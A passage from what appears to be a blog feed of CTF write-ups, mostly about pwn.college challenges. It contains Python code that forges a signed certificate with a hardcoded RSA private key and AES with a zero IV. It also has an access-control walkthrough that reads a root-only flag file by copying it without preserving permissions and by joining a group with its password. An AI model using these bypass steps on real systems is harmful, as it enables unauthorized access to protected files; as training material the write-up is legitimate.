string">"B"</span><span class="token punctuation">,</span> B<span class="token punctuation">)</span>A <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">"cf9c1a7ab2a232bc7bd00767d47b80c6a7060a4be6ed1e300d2fc221ecb5f03b99ecace9ca410dd54f3ce2c7bc6c01562bde8fe33802db3f1bf3ec9eea6e5b94e83b026c1b4eaebc6c93e1d7dffb510ca178f13cd8a0282dcde62298f9927e731deccba33846900ce8ba27064bd825d6a8e9866f044d9a133cb25b86c490ba9dd69f98f87b0811e6bae42bbe8ec5b39e4ba70ef587ceac023419199e5d59fef16d32ce0c71ca87955a7be8e576c6ab37967db4085e80eca4d8914dbcf0129ccc0a25fd4027d42b2b52284738867bbcfa381deadcd259f323b7fec341a37b36b6d3bf91b3b8dab3797ecab100905181f75d34e23f96bb1817706c2a2a3e24267b"</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> b<span class="token punctuation">,</span> p<span class="token punctuation">)</span>key <span class="token operator">=</span> SHA256Hash<span class="token punctuation">(</span>s<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"key : </span><span class="token interpolation"><span class="token punctuation">&#123;</span>key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>cipher_encrypt <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token operator">=</span>key<span class="token punctuation">,</span> mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token operator">=</span><span class="token string">b"\0"</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span>cipher_decrypt <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token operator">=</span>key<span class="token punctuation">,</span> mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token operator">=</span><span class="token string">b"\0"</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt_input_b64</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> unpad<span class="token punctuation">(</span>cipher_encrypt<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> cipher_encrypt<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span>    <span class="token keyword">except</span> ValueError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">import</span> IPythonIPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Hash<span class="token punctuation">.</span>SHA256 <span class="token keyword">import</span> SHA256Hash<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random <span class="token keyword">import</span> get_random_bytes<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random <span class="token keyword">import</span> get_random_bytes<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random<span class="token punctuation">.</span>random <span class="token keyword">import</span> getrandbits<span class="token punctuation">,</span> randrange<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad<span class="token punctuation">,</span> unpaduser_key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>user_certificate <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"gjgdlbujheoykcwn"</span><span class="token punctuation">,</span>    <span class="token string">"key"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"e"</span> <span class="token punctuation">:</span> user_key<span class="token punctuation">.</span>e<span class="token punctuation">,</span>        <span class="token string">"n"</span> <span class="token punctuation">:</span> user_key<span class="token punctuation">.</span>n    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"signer"</span><span class="token punctuation">:</span> <span class="token string">"root"</span><span class="token punctuation">&#125;</span>root_certificate_b64 <span class="token operator">=</span> <span class="token string">"eyJuYW1lIjogInJvb3QiLCAia2V5IjogeyJlIjogNjU1MzcsICJuIjogMTgyMTgzMjEzMjMwMTU1Mzk2NDIxMzg5MzkwODI4NDY5MTcyMDAzMjc0ODY5NDE3NTcxNzIxOTE2NDgzMzIwNjAyMDUwNDE2NTAxOTM2NDE3NDc5MzAyNjYxODEyOTUxMzMxOTcyMDEzODI2MzEzODY1NDk0MzUyMTU5MTEwNjY2NjQyNTUzMDE3MjcyMzc3ODYzMDA0MTY4NTg5MDc0MzYyODcxMzU2NzI2NzgxODM4MjMzNDE5NzMwMTM5Mjg2MDMxMjEyOTM2OTE1OTU1OTExMDY3OTQ2NTg0OTE5OTU1ODUyOTAzNTk3NTc0MjE4ODg0MTk3ODQ0ODU5MjU0NDA0Nzg0NDg0NDM2NTk3ODMxNjI1MzUyNDQ2MjM3NTg2MTQ0MjU4MDA4MjE4MDQxODE0MDczOTM3ODk0Mjg1ODQwMTk5MDY0MzM0OTQyMDc0ODk3MTU3NDE3NDM5OTIyOTk5MDYzMTIxNDYzMjM3NDUwMTgxMzM3MjkzOTA1NjQ1NjkzNjAyODQ4MDEwNTE0NjE0NzA4MDU4ODU3MDIwNDAxMDM2NDI3NTAyMTYyNzY5NzEyMDQ4MjYyODk3NjA5Nzk1NDgwNjA1NjgyMDQ0NDc4MDMwNzc1OTE3ODk4MDczNTY4MDIwNDQ4MTY5MjA3MTgxODM2NjYxNjM5Njk3NjgyMzI4ODk1Mzg5MzAwNTkyODgwNjU5MDY4ODA0Nzk1MjA1MjE1MjA4NjUwNTgxMzY2MDU5Nzk0NzcxMTgzOTQyNDkxMzUwNDMwNjA1MzcwOTI0ODUyOTQ4Mzc3ODE4MzIxMDc1OTA0NDN9LCAic2lnbmVyIjogInJvb3QifQ=="</span>root_certificate <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>root_certificate_b64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>root_certificate<span class="token punctuation">)</span>root_certificate<span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"d"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">"34cbf94a5f0a864b565e660227f48d2e0981b477d1ad4a8aca1f7400e0f528fd1499d23fe34091e6047bd24a876e37083fb7853dec1e20fd5cb743068e6ca520dc791efeba3b23f5dad1ef279d74aa408e148933be82e5f9ff1d5a53fbc6991882794989d481a4ce64378e52d78ac3d30bf37976aebed1f65e9dea0b46d98afd0cd27a32df9942a1b498babdc8edfcfa825431b465236d72c919f9db850c9a8c3d2edaaa3174012933c229adaf2557502eb3cdd9335faf4ce2b37e08ae5f0391dafbed7346a58461d2db1c0e56414942fef0de3c37a5a9a1050f604df8528ba3724d91a776009380c1e705ab06108d7903a681e30f6a1d3065fd0ecb8d9a8141"</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>A <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">"cf9c1a7ab2a232bc7bd00767d47b80c6a7060a4be6ed1e300d2fc221ecb5f03b99ecace9ca410dd54f3ce2c7bc6c01562bde8fe33802db3f1bf3ec9eea6e5b94e83b026c1b4eaebc6c93e1d7dffb510ca178f13cd8a0282dcde62298f9927e731deccba33846900ce8ba27064bd825d6a8e9866f044d9a133cb25b86c490ba9dd69f98f87b0811e6bae42bbe8ec5b39e4ba70ef587ceac023419199e5d59fef16d32ce0c71ca87955a7be8e576c6ab37967db4085e80eca4d8914dbcf0129ccc0a25fd4027d42b2b52284738867bbcfa381deadcd259f323b7fec341a37b36b6d3bf91b3b8dab3797ecab100905181f75d34e23f96bb1817706c2a2a3e24267b"</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>B <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">"3a495db7bc61c676709f7f661a4ea9d50fcd5240b40231be53353cf8d4ab454158b286a4b5c828be6a13a82078d3c15fb7ff060a54ca26c38aac81d20040fd7aa44d84f2fddcff1da2a8dffc2a9c460506cd6e19915e6dc4d99ce6f2d84016b79f2221f53d7eca442ba9e6e360e5bdf316ace4bbc8305fceeaa9aa0fd12c8371e480e7bfd7ed2be3c5de1d7fa2e8d23bbc12598a2c9b6d4d20b93762b74fe1a1fbf936f57b519ecda128f54c4aa496a02e3f5f71c2290c1f5d1e5c0fd69172d3d8f67f849a5f6e44384f958200e2e54d3156c73db4cf354a85e0badd6a4eedfb9a4a11d4412dd389392e0dc4538a67b59584ca2e83650aee6d1df91f8f1e5d80"</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>user_signature_data <span class="token operator">=</span> <span class="token punctuation">(</span>    <span class="token string">"gjgdlbujheoykcwn"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token string">b"\0"</span><span class="token punctuation">)</span> <span class="token operator">+</span>    A<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span> <span class="token operator">+</span>    B<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>user_signature_hash <span class="token operator">=</span> SHA256Hash<span class="token punctuation">(</span>user_signature_data<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>user_signature <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>    <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>user_signature_hash<span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    user_key<span class="token punctuation">.</span>d<span class="token punctuation">,</span>    user_key<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token string">b'\x06\x87G=\xb4&lt;\x85\x9d&amp;\xd5\x17.\xb4\xf4\xb6o'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"key : </span><span class="token interpolation"><span class="token punctuation">&#123;</span>key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>cipher_encrypt <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token operator">=</span>key<span class="token punctuation">,</span> mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token operator">=</span><span class="token string">b"\0"</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span>cipher_decrypt <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token operator">=</span>key<span class="token punctuation">,</span> mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token operator">=</span><span class="token string">b"\0"</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt_input_b64</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> cipher_encrypt<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>data<span class="token punctuation">,</span> cipher_encrypt<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">except</span> ValueError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>user_certificate_hash <span class="token operator">=</span> SHA256Hash<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>user_certificate<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>user_certificate_signature <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>    <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>user_certificate_hash<span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    root_certificate<span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"d"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    root_certificate<span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>user_certificate<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>user_certificate_data <span class="token operator">=</span> encrypt_input_b64<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>user_certificate<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>user_certificate_signature <span class="token operator">=</span> encrypt_input_b64<span class="token punctuation">(</span>user_certificate_signature<span class="token punctuation">)</span>user_signature <span class="token operator">=</span> encrypt_input_b64<span class="token punctuation">(</span>user_signature<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"user_certificate_data:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_certificate_data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"user_certificate_signature:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_certificate_signature<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"user_signature:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_signature<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">import</span> IPythonIPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-Web-4-Writeup</title>
      <link href="/2024/09/12/pwn-college-web-5-writeup/"/>
      <url>/2024/09/12/pwn-college-web-5-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p><a href="https://pwn.college/intro-to-cybersecurity/access-control/">https://pwn.college/intro-to-cybersecurity/access-control/</a></p><h2 id="有价值的问题"><a href="#有价值的问题" class="headerlink" title="有价值的问题"></a>有价值的问题</h2><h3 id="1-文件权限"><a href="#1-文件权限" class="headerlink" title="1. 文件权限"></a>1. 文件权限</h3><p><a href="https://www.runoob.com/linux/linux-file-attr-permission.html%E5%BE%88%E8%AF%A6%E7%BB%86%E7%9A%84%E8%AE%B2%E8%A7%A3">https://www.runoob.com/linux/linux-file-attr-permission.html很详细的讲解</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">os.chmod<span class="token punctuation">(</span><span class="token string">"/bin/cat"</span>, 0o4755<span class="token punctuation">)</span>After:-rwsr-xr-x <span class="token number">1</span> root root <span class="token number">43416</span> Sep  <span class="token number">5</span>  <span class="token number">2019</span> /bin/cat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>**<code>4</code> (Set-UID 位)**：这是设置用户 ID（Set-UID）位。当一个可执行文件设置了 Set-UID 位时，无论哪个用户运行该文件，都会以文件所有者（通常是 <code>root</code>）的身份运行它。</p><p>**<code>2</code> (Set-GID 位)**：这是设置组 ID（Set-GID）位。设置 Set-GID 位的文件在执行时，会以文件所属组的权限执行，用户仍然以自己的用户身份运行，但会获得文件所属组的权限。</p><p>​    </p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>cp 复制文件中有一个选项可以不保持原有文件的劝降</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@access-control~level5:~$ <span class="token function">cp</span> --no-preserve<span class="token operator">=</span>mode /flag ./flahacker@access-control~level5:~$ <span class="token function">ls</span> <span class="token parameter variable">-l</span> ./fla -rw-r--r-- <span class="token number">1</span> root hacker <span class="token number">58</span> Sep <span class="token number">12</span> 03:26 ./flahacker@access-control~level5:~$ <span class="token function">cat</span> ./flapwn.college<span class="token punctuation">&#123;</span>A_d8ZpmLAnm6Z3lcKxbTkBx9jWn.dZjM4MDL0czNxEzW<span class="token punctuation">&#125;</span>hacker@access-control~level5:~$ <span class="token function">ls</span> <span class="token parameter variable">-l</span> /flag-r-------- <span class="token number">1</span> root root <span class="token number">58</span> Sep <span class="token number">12</span> 03:18 /flaghacker@access-control~level5:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">acker@access<span class="token operator">-</span>control<span class="token operator">~</span>level6<span class="token punctuation">:</span><span class="token operator">~</span>$ <span class="token operator">/</span>challenge<span class="token operator">/</span>run <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> Welcome to Access Control! <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>In this series of challenges<span class="token punctuation">,</span> you will be working <span class="token keyword">with</span> various access control systems<span class="token punctuation">.</span>Break the system to get the flag<span class="token punctuation">.</span>In this challenge you will work <span class="token keyword">with</span> different UNIX permissions on the flag<span class="token punctuation">.</span>The flag <span class="token builtin">file</span> <span class="token keyword">is</span> owned by root <span class="token keyword">and</span> a new group<span class="token punctuation">.</span>Hint<span class="token punctuation">:</span> Search <span class="token keyword">for</span> how to join a group <span class="token keyword">with</span> a password<span class="token punctuation">.</span>Before<span class="token punctuation">:</span><span class="token operator">-</span>r<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token number">1</span> root root <span class="token number">58</span> Sep <span class="token number">12</span> <span class="token number">03</span><span class="token punctuation">:</span><span class="token number">38</span> <span class="token operator">/</span>flagAfter<span class="token punctuation">:</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>r<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token number">1</span> root group_qnqnmafv <span class="token number">58</span> Sep <span class="token number">12</span> <span class="token number">03</span><span class="token punctuation">:</span><span class="token number">38</span> <span class="token operator">/</span>flagThe password <span class="token keyword">for</span> group_qnqnmafv <span class="token keyword">is</span><span class="token punctuation">:</span> fjochprbhacker@access<span class="token operator">-</span>control<span class="token operator">~</span>level6<span class="token punctuation">:</span><span class="token operator">~</span>$ <span class="token builtin">id</span>uid<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span> gid<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span> groups<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span>hacker@access<span class="token operator">-</span>control<span class="token operator">~</span>level6<span class="token punctuation">:</span><span class="token operator">~</span>$ newgrp group_qnqnmafvPassword<span class="token punctuation">:</span> Note<span class="token punctuation">:</span> Your home directory <span class="token keyword">is</span> running low on storage<span class="token punctuation">:</span>Filesystem                             Size  Used Avail Use<span class="token operator">%</span> Mounted on<span class="token number">192.168</span><span class="token number">.42</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token operator">/</span>data<span class="token operator">/</span>homes<span class="token operator">/</span>mounts<span class="token operator">/</span><span class="token number">11774</span>  982M  600M  316M  <span class="token number">66</span><span class="token operator">%</span> <span class="token operator">/</span>home<span class="token operator">/</span>hackerFilling your home directory completely could cause you to lose access to the workspace <span class="token keyword">and</span><span class="token operator">/</span><span class="token keyword">or</span> desktop<span class="token punctuation">.</span>You can view a <span class="token builtin">list</span> of the largest files <span class="token keyword">and</span> directories using the command<span class="token punctuation">:</span>  du <span class="token operator">-</span>sh <span class="token operator">/</span>home<span class="token operator">/</span>hacker<span class="token operator">/</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">&#125;</span> <span class="token operator">|</span> sort <span class="token operator">-</span>hhacker@access<span class="token operator">-</span>control<span class="token operator">~</span>level6<span class="token punctuation">:</span><span class="token operator">~</span>$ <span class="token builtin">id</span>uid<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span> gid<span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>group_qnqnmafv<span class="token punctuation">)</span> groups<span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>group_qnqnmafv<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>编程的过程中出现了一个问题:  —–这个地方<code>&#123;&#39;&#39;&#125;</code>并不是空集</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">hacker@access<span class="token operator">-</span>control<span class="token operator">~</span>level17<span class="token punctuation">:</span><span class="token operator">~</span>$ pythonPython <span class="token number">3.11</span><span class="token number">.9</span> <span class="token punctuation">(</span>main<span class="token punctuation">,</span> Apr  <span class="token number">2</span> <span class="token number">2024</span><span class="token punctuation">,</span> <span class="token number">08</span><span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>GCC <span class="token number">13.2</span><span class="token number">.0</span><span class="token punctuation">]</span> on linuxType <span class="token string">"help"</span><span class="token punctuation">,</span> <span class="token string">"copyright"</span><span class="token punctuation">,</span> <span class="token string">"credits"</span> <span class="token keyword">or</span> <span class="token string">"license"</span> <span class="token keyword">for</span> more information<span class="token punctuation">.</span><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token punctuation">&#125;</span><span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">&#125;</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">>=</span> b<span class="token punctuation">)</span><span class="token boolean">False</span><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">&#125;</span><span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'b'</span><span class="token punctuation">&#125;</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">>=</span> b<span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>学习一下，源代码的编程思路。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_subset_equal</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>b <span class="token operator">|</span> a<span class="token punctuation">)</span> <span class="token operator">==</span> b <span class="token comment"># 来判断 a 是不是 b 的子集。  a/b中的每一位都代表一种类别设置。</span>LEVELS <span class="token operator">=</span> <span class="token punctuation">[</span>Level<span class="token punctuation">(</span><span class="token string">"TS"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        Level<span class="token punctuation">(</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        Level<span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        Level<span class="token punctuation">(</span><span class="token string">"UC"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>CATEGORIES <span class="token operator">=</span> <span class="token punctuation">[</span>        Category<span class="token punctuation">(</span><span class="token 